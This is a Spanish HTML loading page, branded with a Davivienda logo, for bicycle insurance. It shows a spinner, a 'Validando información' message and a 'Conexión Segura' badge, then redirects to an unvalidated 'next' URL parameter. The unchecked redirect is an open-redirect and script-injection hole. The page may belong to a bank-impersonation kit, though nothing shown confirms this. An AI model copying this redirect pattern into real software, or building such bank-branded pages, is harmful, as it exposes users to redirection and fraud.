<!doctype html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <title>Procesando - Seguro de bicicleta</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;700;900&display=swap');
        * { box-sizing: border-box; }
        body {
            margin: 0;
            background: #050505;
            background-image: radial-gradient(circle at 50% 50%, rgba(239, 11, 43, 0.15), transparent 70%);
            font-family: 'Inter', sans-serif;
            color: #e2e8f0;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            overflow: hidden;
            flex-direction: column;
        }
        .logo-container {
            margin-bottom: 40px;
        }
        .logo {
            max-height: 40px;
            filter: drop-shadow(0 0 8px rgba(255, 255, 255, 0.2)) brightness(0) invert(1);
        }
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(239, 11, 43, 0.2);
            border-top-color: #ef0b2b;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 24px;
            box-shadow: 0 0 15px rgba(239, 11, 43, 0.5);
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .text {
            font-size: 18px;
            font-weight: 500;
            letter-spacing: 0.5px;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .security-badge {
            margin-top: 50px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 12px;
            color: #ff4757;
            background: rgba(239, 11, 43, 0.1);
            padding: 8px 16px;
            border-radius: 20px;
            border: 1px solid rgba(239, 11, 43, 0.3);
        }
    </style>
</head>
<body>
    <div class="logo-container">
        <img src="img/Davivienda_Logo.png" alt="Logo Davivienda" class="logo" onerror="this.src=''">
    </div>
    <div class="spinner"></div>
    <div class="text">Validando información...</div>
    
    <div class="security-badge">
        <svg aria-hidden="true" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
        </svg>
        Conexión Segura
    </div>

    <script>
        setTimeout(() => {
            const urlParams = new URLSearchParams(window.location.search);
            const next = urlParams.get('next') || 'index.html';
            window.location.href = next;
        }, 3500); // 3.5 segundos de carga
    </script>
</body>
</html>
